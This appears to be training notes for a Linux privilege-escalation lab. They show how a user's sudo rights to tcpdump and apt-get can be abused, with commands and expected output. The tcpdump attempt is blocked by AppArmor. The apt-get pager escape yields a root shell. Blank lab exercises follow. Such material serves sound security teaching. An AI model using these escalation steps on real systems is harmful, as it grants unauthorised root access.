# Abusing Sudo

Inspecting current user's sudo permissions
>``` shell
>joe@debian-privesc:~$ sudo -l
>
># ========== Expected Result ==========
>[sudo] password for joe:
>Matching Defaults entries for joe on debian-privesc:
>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
>
>User joe may run the following commands on debian-privesc:
>    (ALL) (ALL) /usr/bin/crontab -l, /usr/sbin/tcpdump, /usr/bin/apt-get
># =====================================
>```

Attempting to abuse tcpdump sudo permissions
>``` shell
>joe@debian-privesc:~$ COMMAND='id'
>
>joe@debian-privesc:~$ TF=$(mktemp)
>
>joe@debian-privesc:~$ echo "$COMMAND" > $TF
>
>joe@debian-privesc:~$ chmod +x $TF
>
>joe@debian-privesc:~$ sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
>
># ========== Expected Result ==========
>[sudo] password for joe:
>dropped privs to root
>tcpdump: listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
>...
>compress_savefile: execlp(/tmp/tmp.c5hrJ5UrsF, /dev/null) failed: Permission denied
># =====================================
>```

Inspecting the syslog file for 'tcpdump' related events
>``` shell
>joe@debian-privesc:~$ cat /var/log/syslog | grep tcpdump
>
># ========== Expected Result ==========
>...
>Aug 29 02:52:14 debian-privesc kernel: [ 5742.171462] audit: type=1400 audit(1661759534.607:27): apparmor="DENIED" operation="exec" profile="/usr/sbin/tcpdump" name="/tmp/tmp.c5hrJ5UrsF" pid=12280 comm="tcpdump" requested_mask="x" denied_mask="x" fsuid=0 ouid=1000
># =====================================
>```

Verifying AppArmor status
>``` shell
>joe@debian-privesc:~$ su - root
>
># ========== Expected Result ==========
>Password:
># =====================================
>
>root@debian-privesc:~# aa-status
>
># ========== Expected Result ==========
>apparmor module is loaded.
>20 profiles are loaded.
>18 profiles are in enforce mode.
>   /usr/bin/evince
>   /usr/bin/evince-previewer
>   /usr/bin/evince-previewer//sanitized_helper
>   /usr/bin/evince-thumbnailer
>   /usr/bin/evince//sanitized_helper
>   /usr/bin/man
>   /usr/lib/cups/backend/cups-pdf
>   /usr/sbin/cups-browsed
>   /usr/sbin/cupsd
>   /usr/sbin/cupsd//third_party
>   /usr/sbin/tcpdump
>...
>2 profiles are in complain mode.
>   libreoffice-oopslash
>   libreoffice-soffice
>3 processes have profiles defined.
>3 processes are in enforce mode.
>   /usr/sbin/cups-browsed (502)
>   /usr/sbin/cupsd (654)
>   /usr/lib/cups/notifier/dbus (658) /usr/sbin/cupsd
>0 processes are in complain mode.
>0 processes are unconfined but have a profile defined.
># =====================================
>```

'Apt-get' privilege escalation payload
>``` shell
>sudo apt-get changelog apt
>!/bin/sh
>```

Obtaining a root shell by abusing sudo permissions
>``` shell
>joe@debian-privesc:~$ sudo apt-get changelog apt
>
># ========== Expected Result ==========
>...
>Fetched 459 kB in 0s (39.7 MB/s)
># =====================================
>
># id
>
># ========== Expected Result ==========
>uid=0(root) gid=0(root) groups=0(root)
># =====================================
>```

Lab 1 - Connect to VM 1 and repeat the steps discussed in this section in order to obtain a root shell. Which kernel modules enforce MAC policies to further protect the system?
>``` shell
>
>```
>

Lab 2 - Connect to VM 2 and gain a root shell by abusing a sudo misconfiguration.
>``` shell
>
>```
>
